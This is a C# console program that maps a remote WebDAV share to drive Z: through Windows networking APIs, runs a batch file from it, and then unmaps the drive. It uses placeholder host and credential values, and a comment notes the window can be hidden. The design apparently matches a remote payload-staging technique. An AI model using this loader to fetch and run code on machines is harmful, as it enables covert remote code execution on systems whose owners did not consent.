using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Net.NetworkInformation;

namespace WebDAVLauncher
{
    class WebDAVenture
    {
        // Import the WNetAddConnection2 function from the mpr.dll library
        [DllImport("mpr.dll")]
        private static extern int WNetAddConnection2(ref NETRESOURCE lpNetResource, string lpPassword, string lpUsername, uint dwFlags);

        // Import the WNetCancelConnection2 function from the mpr.dll library
        [DllImport("mpr.dll")]
        private static extern int WNetCancelConnection2(string lpName, uint dwFlags, bool bForce);

        [StructLayout(LayoutKind.Sequential)]
        private struct NETRESOURCE
        {
            public uint dwScope;
            public uint dwType;
            public uint dwDisplayType;
            public uint dwUsage;
            public string lpLocalName;
            public string lpRemoteName;
            public string lpComment;
            public string lpProvider;
        }

        static void Main(string[] args)
        {
            string driveLetter = "Z:";
            string webdavUrl = "https://your-site.com/webdav";
            string fileToExecute = Path.Combine(driveLetter, "change-me.bat"); // Adjust the file name and extension as needed
            string username = "example"; // Set this to null if no username is needed
            string password = "example"; // Set this to null if no password is needed

            try
            {
                // Check network connectivity
                if (!IsNetworkAvailable())
                {
                    Console.WriteLine("Network is not available. Exiting.");
                    return;
                }

                // Map the WebDAV share to the specified drive letter
                MapWebDAVDrive(driveLetter, webdavUrl, username, password);

                // Execute the file
                ExecuteFile(fileToExecute);
            }
            finally
            {
                // Unmap the WebDAV share from the specified drive letter
                UnmapWebDAVDrive(driveLetter);
            }
        }

        private static bool IsNetworkAvailable()
        {
            return NetworkInterface.GetIsNetworkAvailable();
        }

        private static void MapWebDAVDrive(string driveLetter, string webdavUrl, string username, string password)
        {
            // Check if the drive letter is already in use
            if (Directory.Exists(driveLetter))
            {
                Console.WriteLine($"Drive letter {driveLetter} is already in use. Exiting.");
                return;
            }

            NETRESOURCE netResource = new NETRESOURCE
            {
                dwType = 1, // RESOURCETYPE_DISK
                lpLocalName = driveLetter,
                lpRemoteName = webdavUrl
            };

            int result = WNetAddConnection2(ref netResource, password, username, 0);

            if (result != 0)
            {
                throw new Exception($"Error mapping WebDAV drive: {result}");
            }

            Console.WriteLine($"Mapped {webdavUrl} to {driveLetter}");
        }

        private static void ExecuteFile(string filePath)
        {
            if (!File.Exists(filePath))
            {
                Console.WriteLine($"File {filePath} does not exist.");
                return;
            }

            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = filePath,
                    UseShellExecute = true, // Ensures the shell is used to start the process
                    CreateNoWindow = false  // Creates a window for the process (set to true if you want it hidden)
                };

                Process process = Process.Start(startInfo);
                if (process != null)
                {
                    // Optional: Wait for the process to exit, with a timeout
                    if (!process.WaitForExit(60000)) // Wait for a maximum of 60 seconds
                    {
                        Console.WriteLine($"Process for {filePath} is taking too long. Killing the process.");
                        process.Kill();
                    }
                    Console.WriteLine($"Successfully executed {filePath}");
                }
                else
                {
                    Console.WriteLine($"Process could not be started for {filePath}");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"Error executing file: {e.Message}");
            }
        }

        private static void UnmapWebDAVDrive(string driveLetter)
        {
            // Ensure that the drive letter is actually mapped before attempting to unmap
            if (!Directory.Exists(driveLetter))
            {
                Console.WriteLine($"Drive letter {driveLetter} is not mapped. Nothing to unmap.");
                return;
            }

            int result = WNetCancelConnection2(driveLetter, 0, true);

            if (result != 0)
            {
                Console.WriteLine($"Error unmapping WebDAV drive: {result}");
            }
            else
            {
                Console.WriteLine($"Unmapped drive {driveLetter}");
            }
        }
    }
}
